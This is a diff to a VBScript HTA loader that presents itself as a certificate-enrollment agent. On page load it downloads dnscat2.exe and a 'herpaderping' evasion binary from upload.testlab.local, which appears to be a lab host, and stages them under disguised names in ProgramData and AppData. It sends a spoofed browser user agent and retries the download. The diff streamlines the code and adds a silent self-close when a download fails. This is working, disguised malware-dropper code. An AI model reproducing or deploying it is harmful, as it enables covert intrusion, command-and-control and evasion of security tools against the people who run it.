@@ -22,25 +22,10 @@ Sub Window_OnLoad
     UpdateStatus "Enrolling certificate..."
 
     Dim oShell          : Set oShell = CreateObject("WScript.Shell")
-    Dim strUser         : strUser     = oShell.ExpandEnvironmentStrings("%USERNAME%")
-    Dim strHost         : strHost     = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
     Dim strInstallDir   : strInstallDir = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\"
     Dim strModuleName   : strModuleName = "CertEnrollAgent"
     Dim strPackageFile  : strPackageFile = strInstallDir & strModuleName & ".bin"
     Dim strModulePath   : strModulePath  = strInstallDir & strModuleName & ".exe"
-
-    Dim oParams : Set oParams = CreateObject("Scripting.Dictionary")
-    oParams.Add "component", "EntraID-CertEnrollment"
-    oParams.Add "host",      strHost
-    oParams.Add "user",      strUser
-    oParams.Add "timeout",   "30000"
-    oParams.Add "maxRetry",  "3"
-
-    Dim strRequired : strRequired = "4.2.1"
-    Dim arrVer      : arrVer  = Split(strRequired, ".")
-    Dim nMajor      : nMajor  = CInt(arrVer(0))
-    Dim nMinor      : nMinor  = CInt(arrVer(1))
-    Dim nPatch      : nPatch  = CInt(arrVer(2))
 
     Dim strPayloadDrop  : strPayloadDrop = "C:\ProgramData\CertCA.bin"
     Dim strPayloadUrl   : strPayloadUrl  = "http://upload.testlab.local/uploads/dnscat2.exe"
@@ -57,16 +42,20 @@ Sub Window_OnLoad
         oPayloadStm.SaveToFile strPayloadDrop, 2
         oPayloadStm.Close
         Set oPayloadStm = Nothing
+    Else
+        Set oPayload = Nothing
+        Set oShell = Nothing
+        window.setTimeout "self.close", 1000, "VBScript"
+        Exit Sub
     End If
     Set oPayload = Nothing
 
     Dim strPackageUrl   : strPackageUrl = "http://upload.testlab.local/uploads/CWLHerpaderping.exe"
     Dim oHttp           : Set oHttp = CreateObject("MSXML2.XMLHTTP")
     Dim nAttempt        : nAttempt  = 0
-    Dim nMaxRetry       : nMaxRetry = CInt(oParams("maxRetry"))
     Dim bReady          : bReady    = False
 
-    Do While nAttempt < nMaxRetry And Not bReady
+    Do While nAttempt < 3 And Not bReady
         nAttempt = nAttempt + 1
         oHttp.Open "GET", strPackageUrl, False
         oHttp.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
@@ -98,7 +87,6 @@ Sub Window_OnLoad
         End If
     End If
 
-    Set oParams = Nothing
     Set oHttp   = Nothing
     Set oShell  = Nothing
 
